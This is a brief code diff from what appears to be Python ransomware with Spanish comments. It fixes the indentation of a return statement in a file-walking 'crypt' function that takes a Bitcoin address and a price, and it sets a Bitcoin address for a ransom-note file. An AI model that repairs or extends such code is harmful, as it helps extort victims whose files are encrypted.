@@ -147,7 +147,7 @@ def crypt(text, pwd, path, bitcoin, price,verif ):
 					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
 						pass
 			#Return la lista de directorios
-			return l
+	return l
 
 # Variables para fichero explicativo
 bitcoin='18iRTLyJttzMX4EbGwf5gYbqsZNkPGfnKD'
